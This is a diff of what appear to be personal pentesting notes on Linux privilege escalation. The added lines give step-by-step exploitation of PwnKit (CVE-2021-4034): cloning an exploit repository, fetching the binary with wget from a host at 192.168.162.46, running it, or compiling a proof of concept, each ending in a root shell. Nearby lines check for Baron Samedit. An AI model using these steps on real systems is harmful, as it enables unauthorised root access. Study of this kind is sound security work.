@@ -259,8 +259,26 @@ PwnKit
 ll /usr/bin/pkexec 
 -rwxr-xr-x 1 root root /usr/bin/pkexec  ..not vuln
 -rwsr--r-- 1 root root /usr/bin/pkexec  ..SUID vulnerable!
-https://github.com/arthepsy/CVE-2021-4034
 
+Quick
+get clone https://github.com/ly4k/PwnKit
+cd PwnKit
+webup 9001
+wget 192.168.162.46:9001/PwnKit
+chmod +x PwnKit
+./PwnKit
+whoami
+root
+
+Compile Version
+https://github.com/arthepsy/CVE-2021-4034 
+vim cve-2021-4034-poc.c 
+gcc cve-2021-4034-poc.c -o cve-2021-4034-poc 
+./cve-2021-4034-poc 
+whoami 
+root 
+
+===================================
 Baron Samedit (CVE-2021-3156)
 sudoedit -s /.     ...Vulnerable: if error sudoedit: /: not a regular file
 sudoedit -s /.     ...Not vuln: sudoedit usage results
